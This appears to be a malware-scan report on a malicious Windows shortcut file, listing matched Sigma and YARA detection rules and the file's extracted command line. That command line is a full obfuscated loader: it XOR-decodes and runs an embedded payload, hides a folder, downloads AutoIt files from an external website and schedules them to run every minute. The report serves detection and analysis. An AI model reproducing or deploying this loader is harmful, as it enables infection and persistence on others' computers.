threat_severity.level_description: Severity HIGH because it was considered trojan. Other contributing factor was that it could not be run in sandboxes.

sigma_analysis_results.rule_title: Copy From Or To Admin Share Or Sysvol Folder
sigma_analysis_results.rule_description: Detects a copy command or a copy utility execution to or from an Admin share or remote
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), oscd.community, Teymur Kheirkhabarov @HeirhabarovT, Zach Stanford @svch0st, Nasreddine Bencherchali

sigma_analysis_results.rule_description: Detects presence of a potentially xor encoded powershell command
sigma_analysis_results.rule_author: Sami Ruohonen, Harish Segar, Tim Shelton, Teymur Kheirkhabarov, Vasiliy Burov, oscd.community, Nasreddine Bencherchali

sigma_analysis_results.rule_title: Suspicious Copy From or To System Directory
sigma_analysis_results.rule_description:
Detects a suspicious copy operation that tries to copy a program from system (System32, SysWOW64, WinSxS) directories to another on disk.
Often used to move LOLBINs such as 'certutil' or 'desktopimgdownldr' to a different location with a different name in order to bypass detections based on locations.
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), Markus Neis, Tim Shelton (HAWK.IO), Nasreddine Bencherchali (Nextron Systems)

sigma_analysis_results.rule_title: File And SubFolder Enumeration Via Dir Command
sigma_analysis_results.rule_description: Detects usage of the "dir" command part of Widows CMD with the "/S" command line flag in order to enumerate files in a specified directory and all subdirectories.

lnk_info.command_line_arguments: /c ||goto&po^w^e^rs^he^l^l -windowstyle hidden function IFaTnEvtWr(){$rkIThgyOCA=Get-ChildItem *.lnk;$rkIThgyOCA=$rkIThgyOCA^|where-object{$_.length -eq 0x000297B8};$DPbwWzZrnp=$rkIThgyOCA;$rkIThgyOCA=$rkIThgyOCA^|Select-Object -ExpandProperty Name;if($rkIThgyOCA.length -eq 0){cd $env:TEMP;$rkIThgyOCA=Get-ChildItem  *.lnk;$rkIThgyOCA=$rkIThgyOCA^|where-object {$_.length -eq 0x000297B8} ;$DPbwWzZrnp=$rkIThgyOCA;$rkIThgyOCA=$rkIThgyOCA^|Select-Object -ExpandProperty Name;}return @($rkIThgyOCA, $DPbwWzZrnp)};function mNOiTDagWf(){$YQmxtLIzHU=IFaTnEvtWr;$rkIThgyOCA=$YQmxtLIzHU[0];$rkIThgyOCA=$rkIThgyOCA.substring(0,$rkIThgyOCA.length-4);return $rkIThgyOCA};function GlbpFfMEOR{$YQmxtLIzHU=mNOiTDagWf;$vKfTgusMPa=IFaTnEvtWr;$rkIThgyOCA=$vKfTgusMPa[0];$UZBMsJbyaN=[System.IO.BinaryReader]::new([System.IO.File]::open($rkIThgyOCA,[System.IO.FileMode]::Open,[System.IO.FileAccess]::ReadWrite,[System.IO.FileShare]::None));try{$UZBMsJbyaN.BaseStream.Seek(0x00001E1F,[System.IO.SeekOrigin]::Begin);$byeLJBfiHV=$UZBMsJbyaN.ReadBytes(0x0000E000);}finally{$UZBMsJbyaN.Close()};for($HItkGsEDAF=0; $HItkGsEDAF -lt $byeLJBfiHV.count; $HItkGsEDAF++) { $byeLJBfiHV[$HItkGsEDAF]=$byeLJBfiHV[$HItkGsEDAF] -bxor 0xD8 };[System.IO.File]::WriteAllBytes($YQmxtLIzHU,$byeLJBfiHV);$Tkrwxgfihp='.\'+$YQmxtLIzHU;^& $Tkrwxgfihp;return 'ayVQOwnTbp'};$Tkrwxgfihp=GlbpFfMEOR;$pdsDruiLeW=IFaTnEvtWr;remove-item -path $pdsDruiLeW[1] -force;&mkdir c:\jAkfqvEWPQ & attrib +h c:\jAkfqvEWPQ & cd /d c:\jAkfqvEWPQ & copy c:\windows\system32\curl.exe jAkfqvEWPQ.exe & jAkfqvEWPQ -k -o AutoIt3.exe https://phasechangesolutions.com/wp-admin/css/colors/coffee/hurryup/?rv=super^&za=mongo0 & jAkfqvEWPQ -k -o ALxYVrmWDC.au3 https://phasechangesolutions.com/wp-admin/css/colors/coffee/hurryup/?rv=super^&za=mongo1 & sc^htas^ks /create /sc minute /mo 1 /tn "ALxYVrmWDC" /tr "c:\jAkfqvEWPQ\AutoIt3.exe c:\jAkfqvEWPQ\ALxYVrmWDC.au3"

crowdsourced_yara_results.description: Detects powershell keyword obfuscated with carets
crowdsourced_yara_results.author: Florian Roth (Nextron Systems)

crowdsourced_yara_results.description: Identifies executable artefacts in shortcut (LNK) files.
crowdsourced_yara_results.author: @bartblaze

crowdsourced_yara_results.description: Identifies archive (compressed) files in shortcut (LNK) files.
crowdsourced_yara_results.author: @bartblaze

crowdsourced_yara_results.description: Identifies execution artefacts in shortcut (LNK) files.
crowdsourced_yara_results.author: @bartblaze

crowdsourced_yara_results.description: Identifies download artefacts in shortcut (LNK) files.
crowdsourced_yara_results.author: @bartblaze

crowdsourced_yara_results.description: Identifies shortcut (LNK) file larger than 100KB. Most goodware LNK files are smaller than 100KB.
crowdsourced_yara_results.author: @bartblaze

crowdsourced_yara_results.description: Identifies shortcut (LNK) file with equal or higher entropy than 6.5. Most goodware LNK files have a low entropy, lower than 6.
crowdsourced_yara_results.author: @bartblaze

crowdsourced_yara_results.description: This YARA file detects padded LNK files designed to exploit ZDI-CAN-25373.
crowdsourced_yara_results.author: Peter Girnus
